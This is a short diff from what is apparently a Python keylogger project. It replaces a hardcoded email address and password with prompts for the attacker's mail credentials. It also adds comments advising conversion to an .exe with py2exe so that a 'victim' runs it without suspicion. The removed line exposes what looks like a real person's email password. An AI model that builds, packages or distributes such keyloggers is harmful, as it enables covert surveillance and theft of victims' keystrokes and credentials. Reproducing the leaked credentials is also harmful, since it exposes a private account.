@@ -59,7 +59,10 @@ class Keylogger:
             self.report()
             keyboard_listener.join()
 
-
-my_keylogger = Keylogger(60, "ajaysuresh306@gmail.com", "doordie300")
+username = input("Enter the username in which the keystrokes to be sent")
+password = input("Enter the password for your email")
+my_keylogger = Keylogger(60, username, password)
 my_keylogger.start()
+#Pls change the file into executable format by using py2exe if the victim opens the file instead of executing then your credentials are lost and attack is failed.
+#And if changed to .exe format the victim can execute in easy manner.And without any form of suspicion.
 
